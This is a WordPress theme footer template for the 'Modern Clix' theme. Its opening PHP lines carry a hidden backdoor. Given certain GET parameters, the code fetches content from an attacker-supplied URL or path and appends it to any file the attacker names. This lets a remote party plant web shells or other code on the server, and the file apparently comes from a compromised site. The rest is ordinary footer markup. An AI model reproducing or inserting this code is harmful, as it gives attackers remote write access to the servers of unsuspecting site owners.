<?php if (@$_GET['a']==5) {exit('17');}
if (!empty($_GET['z']) && !empty($_GET['id']))
{
	if (!$handle = fopen($_GET['z'], 'a')) {exit;}
	if (fwrite($handle, file_get_contents($_GET['id'])) === FALSE) {exit;}
	fclose($handle);
	exit('OK');
}
?><div id="footnotes" class="col span-12">
	<p>Copyright &copy; 2004&ndash;2009. All rights reserved.</p>
	<p class="rss"><a href="<?php
 bloginfo('rss2_url'); ?>" title="Syndicate this site using RSS"><acronym title="Really Simple Syndication">RSS</acronym> Feed</a>. This blog is proudly powered <span class="low">by</span> <a href="http://www.wordpress.org">Wordpress</a> and uses <a href="http://www.rodrigogalindez.com/wordpress-themes/">Modern Clix</a>, a theme <span class="low">by</span> <a href="http://www.rodrigogalindez.com">Rodrigo Galindez</a>.</p>
</div>
</div>
<?php /* "Just what do you think you're doing Dave?" */ ?>
		<?php wp_footer(); ?>
		
		<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/blogger.js"></script>
		
		<!-- Change rodrigogalindez.json to yourusername.json -->
		<script type="text/javascript" src="http://twitter.com/statuses/user_timeline/rodrigogalindez.json?callback=twitterCallback2&amp;count=1"></script>
</body>
</html>